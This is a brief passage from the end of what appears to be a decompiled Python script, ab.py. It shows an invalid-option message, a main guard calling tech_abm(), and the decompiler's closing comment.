        print("[!] Please Select a Valid Option ")
        down()

if __name__ == '__main__':
    tech_abm()



# Okay Decompiling ab.py
